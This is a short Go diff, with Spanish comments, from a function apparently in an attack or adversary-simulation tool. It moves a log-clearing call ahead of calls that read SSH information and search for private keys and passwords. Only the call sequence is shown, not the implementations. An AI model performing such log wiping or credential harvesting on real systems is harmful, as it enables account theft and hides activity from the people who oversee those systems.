@@ -27,18 +27,18 @@ func RunVectorA() {
 
 	time.Sleep(3 * time.Second)
 
-	ReadSSHInformation()
-
-	SearchPrivateKeysOrPasswords() // Ajustar tarda bastante tiempo
-
-	time.Sleep(3 * time.Second)
-
 	err := ClearLogActivities()
 	if err != nil {
 		fmt.Println("Error:", err)
 	} else {
 		fmt.Println("El contenido del archivo fue eliminado exitosamente.")
 	}
+
+	ReadSSHInformation()
+
+	SearchPrivateKeysOrPasswords() // Ajustar tarda bastante tiempo
+
+	time.Sleep(3 * time.Second)
 
 	// Esperar 3 segundos
 	time.Sleep(3 * time.Second)
